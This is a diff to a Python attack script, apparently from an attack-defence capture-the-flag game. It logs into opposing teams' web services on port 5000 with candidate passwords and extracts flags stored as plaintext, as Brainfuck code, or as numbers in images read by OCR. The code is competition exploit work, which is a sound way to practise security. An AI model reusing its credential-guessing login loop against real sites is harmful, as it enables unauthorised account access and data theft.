@@ -9,6 +9,7 @@ import json
 import time
 import re
 import sys
+import easyocr
  
 import bfParser
 
@@ -37,6 +38,30 @@ with requests.Session() as s:
                 p = s1.post('http://{}:5000/login?next=%2Fhome'.format(ip), data = 'csrf_token={}&username={}&password={}&submit=Sign+In'.format(csrf[0], user, c).encode('UTF-8'), headers = headers)
                 if "Hello!" not in p.text:
                     continue
+                posts = re.findall('TEAM\d{3}_[A-Z0-9]{32}', p.text)
+                print(posts) # Получили все флаги, хранящиеся в открытом виде
+                
+                posts = re.findall('">([\-\[\&gt;+l\]\.]+)<[\/]', p.text)
+                for bf in posts:
+                    bf = bf.replace("&gt;",">")
+                    bf = bf.replace("&lt;","<")
+                    res = bfParser.evaluate(bf)
+                    print(res) # Получили флаги, хранящиеся в виде брейнфак кода
+
+                
+                images = re.findall('src=" /image/(.*).png"', p.text)
+                for image in images:
+                    p = s.get('http://{}:5000/image/{}.png'.format(ip, image))
+                    if p.status_code == 200:
+                        with open("321.png", 'wb') as f:
+                            f.write(p.content)
+                    reader = easyocr.Reader(['en'])
+                    result = reader.readtext('321.png', detail = 0)
+                    result = ' '.join(result)
+                    nums = re.findall(r'\d\d', result)
+                    flag2 = ''.join((chr(int(c))) for c in nums)
+                    print(flag2) # Получили флаги из картинок
+
                 p = s1.get('http://{}:5000/user/{}'.format(ip, user))
                 posts = re.findall('TEAM\d{3}_[A-Z0-9]{32}', p.text)
                 if posts:
